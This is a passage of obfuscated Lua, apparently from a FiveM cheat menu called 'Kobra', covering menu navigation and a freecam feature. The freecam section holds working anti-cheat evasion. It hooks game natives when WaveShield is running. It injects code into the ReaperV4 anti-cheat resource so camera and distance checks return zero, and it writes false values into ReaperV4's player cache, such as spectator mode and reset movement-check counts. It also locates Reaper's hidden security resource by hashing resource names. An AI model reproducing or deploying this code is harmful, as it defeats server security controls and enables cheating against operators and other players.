;while true do if (v761==(2 -1)) then v185:UpdateElements(v17);if ((v188.scrollType=="onScroll") and v188.onSelect) then if (v188.type=="scrollable-checkbox") then v188.onSelect(v188.values[v188.value],v188.checked or false );else v188.onSelect(v188.values[v188.value]);end end break;end if (v761==0) then v188.value=v188.value or (2 -1) ;if (v186=="Left") then local v1142=0 + 0 ;while true do if (v1142==0) then v188.value=v188.value-1 ;if (v188.value<(1 + 0)) then v188.value= #v188.values;end break;end end elseif (v186=="Right") then local v1265=0;while true do if (v1265==(0 + 0)) then v188.value=v188.value + 1 + 0 ;if (v188.value> #v188.values) then v188.value=1;end break;end end end v761=1 + 0 ;end end elseif ((v188.type=="slider") or (v188.type=="slider-checkbox")) then local v911=0;local v912;while true do if ((3 -1)==v911) then v185:UpdateElements(v17);if ((v188.scrollType=="onScroll") and v188.onSelect) then if (v188.type=="slider-checkbox") then v188.onSelect(v188.value,v188.checked or false );else v188.onSelect(v188.value);end end break;end if ((0 + 0)==v911) then v188.value=v188.value or v188.min or (0 -0) ;v912=v188.step or (1 + 0) ;v911=1;end if (v911==1) then if (v186=="Left") then v188.value=math.max(v188.min or 0 ,v188.value-v912 );elseif (v186=="Right") then v188.value=math.min(v188.max or 100 ,v188.value + v912 );end for v1181,v1182 in pairs(v25) do if ((v1182.type=="slider-checkbox") and (type(v1182.value)~="nil") and (v1182.label==v188.label)) then if (v186=="Left") then v1182.value=math.max(v188.min or (51 -(12 + 39)) ,v188.value-v912 );elseif (v186=="Right") then v1182.value=math.min(v188.max or (94 + 6) ,v188.value + v912 );else return;end end end v911=5 -3 ;end end end break;end end end;v12.Enter=function(v189) if ( not v17 or ( #v17==(0 -0))) then return;end local v190=v17[v15];if  not v190 then return;end if  not v24 then return;end if (v190.type=="subMenu") then local v519=0 + 0 ;while true do if (v519==1) then if (v190.type=="Server") then v12:UpdateListMenu();end if (v190.categories and (type(v190.categories)=="table") and ( #v190.categories>0)) then local v913=0 + 0 ;while true do if (v913==(0 -0)) then v18=v190.categories;v19=1 + 0 ;v913=4 -3 ;end if (v913==(1712 -(1596 + 114))) then v189:UpdateElements(v17);return;end if (v913==(2 -1)) then v17=v18[v19].tabs or {} ;v15=714 -(164 + 549) ;v913=1440 -(1059 + 379) ;end end end v519=2 -0 ;end if (v519==2) then if (v190.subTabs and (type(v190.subTabs)=="table") and ( #v190.subTabs>(0 + 0))) then local v914=0;while true do if (v914==(1 + 1)) then v189:UpdateElements(v17);return;end if (v914==1) then v17=v190.subTabs;v15=393 -(145 + 247) ;v914=2 + 0 ;end if (0==v914) then v18=nil;v19=1 + 0 ;v914=1;end end end return;end if (v519==0) then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v190.label or "Submenu" );v519=1;end end end if ((v190.type=="button") and v190.onSelect and (type(v190.onSelect)=="function")) then local v520=0 -0 ;local v521;local v522;while true do if (v520==1) then return;end if (v520==(0 + 0)) then v521,v522=pcall(v190.onSelect);if  not v521 then v189:Debug("red","onSelect error: "   .. tostring(v522) );end v520=1;end end end if ((v190.type=="checkbox") or (v190.type=="scrollable-checkbox") or (v190.type=="slider-checkbox")) then if v190.locked then local v674=0 + 0 ;while true do if (v674==(0 -0)) then v189:Notify("error","Kobra","This module has been disabled due to high detection rates!",3720 -(254 + 466) );return;end end end if (type(v190.checked)~="boolean") then v190.checked=true;else v190.checked= not v190.checked;end if (v190.onSelect and (type(v190.onSelect)=="function")) then if (v190.type=="scrollable-checkbox") then local v858,v859=pcall(v190.onSelect,v190.values[v190.value],v190.checked);if  not v858 then v189:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v859) );end elseif (v190.type=="slider-checkbox") then local v1023,v1024=pcall(v190.onSelect,v190.value,v190.checked);if  not v1023 then v189:Debug("red","slider-checkbox onSelect error: "   .. tostring(v1024) );end else local v1025=560 -(544 + 16) ;local v1026;local v1027;while true do if (v1025==(0 -0)) then v1026,v1027=pcall(v190.onSelect,v190.checked);if  not v1026 then v189:Debug("red","checkbox onSelect error: "   .. tostring(v1027) );end break;end end end end v189:UpdateElements(v17);return;end if ((v190.type=="scrollable") or (v190.type=="scrollable-checkbox")) then local v523=0;while true do if (v523==(628 -(294 + 334))) then if (v190.values and (type(v190.values)=="table") and ( #v190.values>(253 -(236 + 17)))) then if v190.onSelect then v190.onSelect(v190.values[v190.value]);end end return;end end end if ((v190.type=="slider") or (v190.type=="slider-checkbox")) then local v524=0 + 0 ;while true do if (v524==(0 + 0)) then if ((v190.scrollType=="onEnter") and v190.onSelect) then if (v190.type=="slider-checkbox") then v190.onSelect(v190.value,v190.checked or false );else v190.onSelect(v190.value);end end return;end end end end;local v63=false;v12.Backspace=function(v191) if ( #v20>(0 -0)) then local v525=0;local v526;while true do if (v525==3) then v191:UpdateElements(v17);break;end if (v525==(9 -7)) then v19=v526.categoryIndex or (1 + 0) ;v15=1;v525=3 + 0 ;end if (v525==1) then v17=v526.menu or v16 ;v18=v526.categories;v525=796 -(413 + 381) ;end if (v525==0) then v526=table.remove(v20);table.remove(v21);v525=1 + 0 ;end end else v191:HideUI();end end;v12.PrevCategory=function(v192) local v193=0 -0 ;while true do if (v193==(2 -1)) then if (v19<1) then v19= #v18;end v17=v18[v19].tabs or {} ;v193=2;end if (v193==(1972 -(582 + 1388))) then v15=1 -0 ;v192:UpdateElements(v17);v193=3 + 0 ;end if (v193==0) then if ( not v18 or ( #v18==(364 -(326 + 38)))) then return;end v19=v19-1 ;v193=2 -1 ;end if (v193==(3 -0)) then v192:SendMessage({action="keydown",index=v15-1 });break;end end end;v12.NextCategory=function(v194) local v195=620 -(47 + 573) ;while true do if (v195==2) then v15=1;v194:UpdateElements(v17);v195=3;end if (v195==3) then v194:SendMessage({action="keydown",index=v15-(1 + 0) });break;end if (v195==0) then if ( not v18 or ( #v18==0)) then return;end v19=v19 + 1 ;v195=4 -3 ;end if (v195==(1 -0)) then if (v19> #v18) then v19=1665 -(1269 + 395) ;end v17=v18[v19].tabs or {} ;v195=494 -(76 + 416) ;end end end;v12.ToggleFreecam=function(v196,v197,v198) if (type(v197)~="boolean") then return;end if v197 then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000 -(319 + 124) ,function(...) return false, -1;end);MachoHookNative(11673589000000000000,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -  -90205960 ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -(564 + 443) ,function(...) return false,0 -0 ;end);MachoHookNative(12777102000000000000 -(337 + 121) ,function(...) return false,false;end);MachoHookNative(1858573000000000000,function(...) return false,0 -0 ;end);MachoHookNative(15349248000000000000 -  -96859916 ,function(...) return false,1911 -(1261 + 650) ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);MachoHookNative(11059360000000000000 -1094852455 ,function(...) return false,true;end);_G.KobraFreecamSpeed=v198;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1064,v1065) local v1066=0 -0 ;local v1067;while true do if (v1066==(144 -(102 + 42))) then v1067=_G[v1064];if ( not v1067 or (type(v1067)~="function")) then return;end v1066=1845 -(1524 + 320) ;end if (v1066==1) then _G[v1064]=function(...) return v1065(v1067,...);end;break;end end end local function v1028(v1068) local v1069=1270 -(1049 + 221) ;local v1070;local v1071;local v1072;while true do if (1==v1069) then v1072=math.abs(math.cos(v1071));return vector3( -math.sin(v1070) * v1072 ,math.cos(v1070) * v1072 ,math.sin(v1071));end if (v1069==(156 -(18 + 138))) then v1070=math.rad(v1068.z);v1071=math.rad(v1068.x);v1069=1;end end end local function v1029(v1073) local v1074=0 -0 ;local v1075;while true do if (v1074==(1102 -(67 + 1035))) then v1075=math.rad(v1073.z);return vector3(math.cos(v1075),math.sin(v1075),348 -(136 + 212) );end end end local function v1030(v1076,v1077,v1078) local v1079=0 -0 ;while true do if ((0 + 0)==v1079) then if (v1076<v1077) then return v1077;end if (v1076>v1078) then return v1078;end v1079=1 + 0 ;end if (v1079==(1605 -(240 + 1364))) then return v1076;end end end hNative("RotationToDirection",function(v1080,...) return v1080(...);end);hNative("GetRightVector",function(v1081,...) return v1081(...);end);hNative("Clamp",function(v1082,...) return v1082(...);end);hNative("CreateThread",function(v1083,...) return v1083(...);end);hNative("Wait",function(v1084,...) return v1084(...);end);hNative("IsVehicleSeatFree",function(v1085,...) return v1085(...);end);hNative("PlayerPedId",function(v1086,...) return v1086(...);end);hNative("GetEntityCoords",function(v1087,...) return v1087(...);end);hNative("CreateCam",function(v1088,...) return v1088(...);end);hNative("DoesCamExist",function(v1089,...) return v1089(...);end);hNative("SetCamCoord",function(v1090,...) return v1090(...);end);hNative("SetCamRot",function(v1091,...) return v1091(...);end);hNative("RenderScriptCams",function(v1092,...) return v1092(...);end);hNative("DestroyCam",function(v1093,...) return v1093(...);end);hNative("SetFocusEntity",function(v1094,...) return v1094(...);end);hNative("SetTextFont",function(v1095,...) return v1095(...);end);hNative("SetTextProportional",function(v1096,...) return v1096(...);end);hNative("SetTextScale",function(v1097,...) return v1097(...);end);hNative("SetTextDropShadow",function(v1098,...) return v1098(...);end);hNative("SetTextEdge",function(v1099,...) return v1099(...);end);hNative("SetTextOutline",function(v1100,...) return v1100(...);end);hNative("SetTextCentre",function(v1101,...) return v1101(...);end);hNative("SetTextColour",function(v1102,...) return v1102(...);end);hNative("BeginTextCommandDisplayText",function(v1103,...) return v1103(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1104,...) return v1104(...);end);hNative("EndTextCommandDisplayText",function(v1105,...) return v1105(...);end);hNative("GetCamCoord",function(v1106,...) return v1106(...);end);hNative("GetCamRot",function(v1107,...) return v1107(...);end);hNative("IsControlPressed",function(v1108,...) return v1108(...);end);hNative("GetDisabledControlNormal",function(v1109,...) return v1109(...);end);hNative("TaskStandStill",function(v1110,...) return v1110(...);end);hNative("SetFocusPosAndVel",function(v1111,...) return v1111(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1112,...) return v1112(...);end);hNative("GetShapeTestResult",function(v1113,...) return v1113(...);end);hNative("IsControlJustPressed",function(v1114,...) return v1114(...);end);hNative("IsDisabledControlJustPressed",function(v1115,...) return v1115(...);end);hNative("IsEntityAVehicle",function(v1116,...) return v1116(...);end);hNative("TaskWarpPedIntoVehicle",function(v1117,...) return v1117(...);end);hNative("SetEntityCoords",function(v1118,...) return v1118(...);end);hNative("GiveWeaponToPed",function(v1119,...) return v1119(...);end);hNative("SetCurrentPedWeapon",function(v1120,...) return v1120(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1121,...) return v1121(...);end);local v1031=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1031.x,v1031.y,v1031.z + 2 );SetCamRot(_G.KobraFreecamObject,1082 -(1050 + 32) ,0,GetEntityHeading(PlayerPedId()),7 -5 );RenderScriptCams(true,false,0,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if _G.KobraFreecamObject then local v1267=GetCamCoord(_G.KobraFreecamObject);local v1268=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1269=_G.KobraFreecamSpeed or (1055.25 -(331 + 724)) ;local v1270=(IsControlPressed(0,2 + 19 ) and (v1269 + 1)) or v1269 ;local v1271=v1028(v1268);local v1272=v1029(v1268);local v1273,v1274,v1275=644 -(269 + 375) ,725 -(267 + 458) ,0 + 0 ;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1267.x,v1267.y,v1267.z,0 -0 ,818 -(667 + 151) ,1497 -(1410 + 87) );if IsControlPressed(0,1929 -(1504 + 393) ) then local v1401=0 -0 ;while true do if (v1401==(0 -0)) then v1273=v1273 + (v1271.x * v1270) ;v1274=v1274 + (v1271.y * v1270) ;v1401=797 -(461 + 335) ;end if ((1 + 0)==v1401) then v1275=v1275 + (v1271.z * v1270) ;break;end end end if IsControlPressed(1761 -(1730 + 31) ,33) then v1273=v1273-(v1271.x * v1270) ;v1274=v1274-(v1271.y * v1270) ;v1275=v1275-(v1271.z * v1270) ;end if IsControlPressed(1667 -(728 + 939) ,120 -86 ) then local v1402=0 -0 ;while true do if ((0 -0)==v1402) then v1273=v1273-(v1272.x * v1270) ;v1274=v1274-(v1272.y * v1270) ;break;end end end if IsControlPressed(1068 -(138 + 930) ,35) then local v1403=0;while true do if (v1403==0) then v1273=v1273 + (v1272.x * v1270) ;v1274=v1274 + (v1272.y * v1270) ;break;end end end if IsControlPressed(0 + 0 ,22) then v1275=v1275 + v1270 ;end if IsControlPressed(0 + 0 ,31 + 5 ) then v1275=v1275-v1270 ;end SetCamCoord(_G.KobraFreecamObject,v1267.x + v1273 ,v1267.y + v1274 ,v1267.z + v1275 );local v1276=GetDisabledControlNormal(0 -0 ,1);local v1277=GetDisabledControlNormal(0,2);local v1278=v1030(v1268.x-(v1277 * (1771 -(459 + 1307))) , -(1959 -(474 + 1396)),154 -65 );local v1279=v1268.z-(v1276 * (5 + 0)) ;SetCamRot(_G.KobraFreecamObject,v1278,v1268.y,v1279,2);end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v198   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v860=0 + 0 ;local v861;local v862;while true do if ((2 -1)==v860) then function v861() local v1146=false;local function v1147(v1183,v1184) v1184=v1184 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1183=v1183   .. v1184 ;local v1185=682 + 4699 ;for v1280=3 -2 , #v1183 do local v1281=0 -0 ;local v1282;while true do if (0==v1281) then v1282=string.byte(v1183,v1280);v1185=(v1185 * (624 -(562 + 29)))~v1282 ;break;end end end return v1185;end local v1148=GetConvar("reaper_security_resource","");local v1149=tonumber(v1148);if  not v1149 then return;end local v1150=GetNumResources() or 0 ;local v1151={};for v1186=0 + 0 ,v1150-(1420 -(374 + 1045))  do local v1187=0 + 0 ;local v1188;while true do if (v1187==(0 -0)) then v1188=GetResourceByFindIndex(v1186);if (v1188 and (v1188~="")) then table.insert(v1151,v1188);end break;end end end if ( #v1151==(638 -(448 + 190))) then return;end local v1152=0 + 0 ;local v1153=nil;for v1189,v1190 in ipairs(v1151) do v1152=v1152 + 1 + 0 ;if (v1147(v1190)==v1149) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1190 );v1153=v1190;break;end local v1191=v1190:gsub("[-_]","");if ((v1191~=v1190) and (v1147(v1191)==v1149)) then v1153=v1191;break;end if ((v1152%(33 + 17))==(0 -0)) then Wait(0 -0 );end end if v1153 then return v1153;end end v862=v861();v860=1496 -(1307 + 187) ;end if (v860==(0 -0)) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v861=nil;v860=1;end if (v860==(8 -4)) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end if ((5 -3)==v860) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(933 -(232 + 451) );v860=3 + 0 ;end if (v860==(3 + 0)) then if v862 then MachoInjectResource(v862,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v860=4;end end end _G.KobraFreecamSpeed=v198;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v915,v916) local v917=564 -(510 + 54) ;local v918;while true do if (v917==(1 -0)) then _G[v915]=function(...) return v916(v918,...);end;break;end if (v917==(36 -(13 + 23))) then v918=_G[v915];if ( not v918 or (type(v918)~="function")) then return;end v917=1 -0 ;end end end local function v863(v919) local v920=math.rad(v919.z);local v921=math.rad(v919.x);local v922=math.abs(math.cos(v921));return vector3( -math.sin(v920) * v922 ,math.cos(v920) * v922 ,math.sin(v921));end local function v864(v923) local v924=math.rad(v923.z);return vector3(math.cos(v924),math.sin(v924),0);end local function v865(v925,v926,v927) local v928=0;while true do if (v928==(1 -0)) then return v925;end if (v928==(0 -0)) then if (v925<v926) then return v926;end if (v925>v927) then return v927;end v928=1089 -(830 + 258) ;end end end hNative("RotationToDirection",function(v929,...) return v929(...);end);hNative("GetRightVector",function(v930,...) return v930(...);end);hNative("Clamp",function(v931,...) return v931(...);end);hNative("CreateThread",function(v932,...) return v932(...);end);hNative("Wait",function(v933,...) return v933(...);end);hNative("IsVehicleSeatFree",function(v934,...) return v934(...);end);hNative("PlayerPedId",function(v935,...) return v935(...);end);hNative("GetEntityCoords",function(v936,...) return v936(...);end);hNative("CreateCam",function(v937,...) return v937(...);end);hNative("DoesCamExist",function(v938,...) return v938(...);end);hNative("SetCamCoord",function(v939,...) return v939(...);end);hNative("SetCamRot",function(v940,...) return v940(...);end);hNative("RenderScriptCams",function(v941,...) return v941(...);end);hNative("DestroyCam",function(v942,...) return v942(...);end);hNative("SetFocusEntity",function(v943,...) return v943(...);end);hNative("SetTextFont",function(v944,...) return v944(...);end);hNative("SetTextProportional",function(v945,...) return v945(...);end);hNative("SetTextScale",function(v946,...) return v946(...);end);hNative("SetTextDropShadow",function(v947,...) return v947(...);end);hNative("SetTextEdge",function(v948,...) return v948(...);end);hNative("SetTextOutline",function(v949,...) return v949(...);end);hNative("SetTextCentre",function(v950,...) return v950(...);end);hNative("SetTextColour",function(v951,...) return v951(...);end);hNative("BeginTextCommandDisplayText",function(v952,...) return v952(...);end);hNative("AddTextComponentSubstringPlayerName",function(v953,...) return v953(...);end);hNative("EndTextCommandDisplayText",function(v954,...) return v954(...);end);hNative("GetCamCoord",function(v955,...) return v955(...);end);hNative("GetCamRot",function(v956,...) return v956(...);end);hNative("IsControlPressed",function(v957,...) return v957(...);end);hNative("GetDisabledControlNormal",function(v958,...) return v958(...);end);hNative("TaskStandStill",function(v959,...) return v959(...);end);hNative("SetFocusPosAndVel",function(v960,...) return v960(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v961,...) return v961(...);end);hNative("GetShapeTestResult",function(v962,...) return v962(...);end);hNative("IsControlJustPressed",function(v963,...) return v963(...);end);hNative("IsDisabledControlJustPressed",function(v964,...) return v964(...);end);hNative("IsEntityAVehicle",function(v965,...) return v965(...);end);hNative("TaskWarpPedIntoVehicle",function(v966,...) return v966(...);end);hNative("SetEntityCoords",function(v967,...) return v967(...);end);hNative("GiveWeaponToPed",function(v968,...) return v968(...);end);hNative("SetCurrentPedWeapon",function(v969,...) return v969(...);end);hNative("ShootSingleBulletBetweenCoords",function(v970,...) return v970(...);end);local v866=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v866.x,v866.y,v866.z + (6 -4) );SetCamRot(_G.KobraFreecamObject,0 + 0 ,0 + 0 ,GetEntityHeading(PlayerPedId()),1443 -(860 + 581) );RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 + 0 );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1154=0;local v1155;local v1156;local v1157;local v1158;local v1159;local v1160;local v1161;local v1162;local v1163;local v1164;local v1165;local v1166;local v1167;while true do if (v1154==(244 -(237 + 4))) then if IsControlPressed(0 -0 ,88 -53 ) then local v1435=0 -0 ;while true do if (v1435==(0 + 0)) then v1161=v1161 + (v1160.x * v1158) ;v1162=v1162 + (v1160.y * v1158) ;break;end end end if IsControlPressed(0 + 0 ,22) then v1163=v1163 + v1158 ;end if IsControlPressed(0 -0 ,16 + 20 ) then v1163=v1163-v1158 ;end SetCamCoord(_G.KobraFreecamObject,v1155.x + v1161 ,v1155.y + v1162 ,v1155.z + v1163 );v1154=4;end if (v1154==(3 + 1)) then v1164=GetDisabledControlNormal(1426 -(85 + 1341) ,1 -0 );v1165=GetDisabledControlNormal(0 -0 ,2);v1166=v865(v1156.x-(v1165 * (377 -(45 + 327))) , -89,167 -78 );v1167=v1156.z-(v1164 * 5) ;v1154=507 -(444 + 58) ;end if (v1154==(3 + 2)) then SetCamRot(_G.KobraFreecamObject,v1166,v1156.y,v1167,1 + 1 );break;end if (v1154==(1 + 0)) then v1159=v863(v1156);v1160=v864(v1156);v1161,v1162,v1163=0 -0 ,1732 -(64 + 1668) ,0;TaskStandStill(PlayerPedId(),1983 -(1227 + 746) );v1154=5 -3 ;end if (v1154==(3 -1)) then SetFocusPosAndVel(v1155.x,v1155.y,v1155.z,494 -(415 + 79) ,0 + 0 ,491 -(142 + 349) );if IsControlPressed(0,32) then local v1436=0 + 0 ;while true do if (v1436==(1 -0)) then v1163=v1163 + (v1159.z * v1158) ;break;end if (v1436==0) then v1161=v1161 + (v1159.x * v1158) ;v1162=v1162 + (v1159.y * v1158) ;v1436=1 + 0 ;end end end if IsControlPressed(0 + 0 ,89 -56 ) then local v1437=1864 -(1710 + 154) ;while true do if (v1437==1) then v1163=v1163-(v1159.z * v1158) ;break;end if (v1437==(318 -(200 + 118))) then v1161=v1161-(v1159.x * v1158) ;v1162=v1162-(v1159.y * v1158) ;v1437=1 + 0 ;end end end if IsControlPressed(0,58 -24 ) then local v1438=0 -0 ;while true do if (0==v1438) then v1161=v1161-(v1160.x * v1158) ;v1162=v1162-(v1160.y * v1158) ;break;end end end v1154=3 + 0 ;end if (v1154==(0 + 0)) then v1155=GetCamCoord(_G.KobraFreecamObject);v1156=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1157=_G.KobraFreecamSpeed or (0.25 + 0) ;v1158=(IsControlPressed(0 -0 ,1271 -(363 + 887) ) and (v1157 + 1)) or v1157 ;v1154=1;end end end end end);else _G.KobraFreecamEnabled=true;end end else local v527=0 -0 ;while true do if (v527==1) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v1122=0 -0 ;while true do if (v1122==(1 + 1)) then hNative("CreateCam",function(v1299,...) return v1299(...);end);hNative("SetCamCoord",function(v1300,...) return v1300(...);end);hNative("SetCamRot",function(v1301,...) return v1301(...);end);hNative("RenderScriptCams",function(v1302,...) return v1302(...);end);v1122=6 -3 ;end if (v1122==(7 + 3)) then hNative("ShootSingleBulletBetweenCoords",function(v1303,...) return v1303(...);end);RenderScriptCams(false,false,0,true,true);if _G.KobraFreecamObject then local v1404=1664 -(674 + 990) ;while true do if (v1404==(0 + 0)) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v1122==(1 + 0)) then hNative("Wait",function(v1304,...) return 